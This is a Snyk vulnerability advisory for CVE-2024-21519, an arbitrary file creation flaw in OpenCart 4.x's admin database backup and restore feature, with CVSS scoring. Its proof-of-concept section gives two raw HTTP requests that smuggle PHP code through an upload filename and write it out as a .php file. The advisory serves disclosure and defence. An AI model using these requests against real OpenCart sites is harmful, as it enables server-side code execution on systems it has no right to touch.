[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)

2. [Snyk Vulnerability Database](/vuln)
3. [Composer](/vuln/composer)
4. opencart/opencart
# Arbitrary File Creation Affecting [opencart/opencart](/package/composer/opencart/opencart) package, versions **>=4.0.0.0**

---

### Severity

 Recommended 0.0high010

CVSS assessment made by Snyk's Security Team. [Learn more](/vuln/SNYK-PHP-OPENCARTOPENCART-7266579#cvss)

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)
for more details.

**0.05% (20th percentile)**
### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)

* Snyk ID**SNYK-PHP-OPENCARTOPENCART-7266579**
* published**21 Jun 2024**
* disclosed**17 Jun 2024**
* credit**Calum Hutton**

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
#### Introduced: 17 Jun 2024

[CVE-2024-21519  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21519) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-20  (opens in a new tab)](https://cwe.mitre.org/data/definitions/20.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

There is no fixed version for `opencart/opencart`.

## Overview

[opencart/opencart](https://packagist.org/packages/opencart/opencart) is a shopping cart system

Affected versions of this package are vulnerable to Arbitrary File Creation. An Arbitrary File Creation issue was identified via the database restoration functionality. By injecting PHP code into the database, an attacker with admin privileges can create a backup file with an arbitrary filename (including the extension), within `/system/storage/backup`.

**Note:**

It is less likely for the created file to be available within the web root, as part of the security recommendations for the application suggest moving the storage path outside of the web root.

## PoC

All user input (`$_GET`, `$_POST` etc) is passed through `htmlspecialchars` at startup, so by default will be stored in the database encoded. There are some places where this isn't the case though, such as with the `filename` parameter of the admin `tool/upload.upload` route:

```
POST http://127.0.0.1/opencart/admin/index.php?route=tool/upload.upload&user_token=cd4d0433339a18c414c67e090c96a9f2 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------77933938835128784303963783419
Content-Length: 245
Origin: http://127.0.0.1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Cookie: OCSESSID=4ae25f8f71432cba08ae148b63; currency=USD; authorize=7d90c76197634c3ac515bdf5fc3c6c7b

-----------------------------77933938835128784303963783419
Content-Disposition: form-data; name="file"; filename="my_<?php phpinfo() ?>file.png"
Content-Type: image/png

XXX
-----------------------------77933938835128784303963783419--

```

`html_entity_decode` is used to decode the input and allows for bypass of the `htmlspecialchars`. This `filename` data is stored within the `oc_upload` database table.

By restoring the table and supplying the `filename` parameter it is possible to write the records to an arbitrary file i.e. `my_script.php`:

```
POST http://127.0.0.1/opencart/admin/index.php?route=tool/backup.backup&user_token=cd4d0433339a18c414c67e090c96a9f2&table=oc_upload&filename=my_script.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 22
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/opencart/admin/index.php?route=tool/backup&user_token=cd4d0433339a18c414c67e090c96a9f2
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Cookie: OCSESSID=4ae25f8f71432cba08ae148b63; currency=USD; authorize=7d90c76197634c3ac515bdf5fc3c6c7b

backup%5B%5D=oc_upload

```
## References

* [Vulnerable Code](https://github.com/opencart/opencart/blob/4.0.2.3/upload/admin/controller/tool/upload.php#L353)
### CVSS Scores

version 4.0version 3.1
### Snyk

 Recommended 7.5 high

* Attack Vector (AV)

  The attack can be performed over the network.

  **Network**
* Attack Complexity (AC)

  The attack does not require special conditions.

  **Low**
* Attack Requirements (AT)

  The attack requires special conditions to be present.

  **Present**
* Privileges Required (PR)

  High-level privileges are required.

  **High**
* User Interaction (UI)

  No user interaction is required.

  **None**

* Confidentiality (VC)

  Significant impact on confidentiality.

  **High**
* Integrity (VI)

  Significant impact on integrity.

  **High**
* Availability (VA)

  Significant impact on availability.

  **High**

* Confidentiality (SC)

  No impact on confidentiality.

  **None**
* Integrity (SI)

  No impact on integrity.

  **None**
* Availability (SA)

  No impact on availability.

  **None**
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.

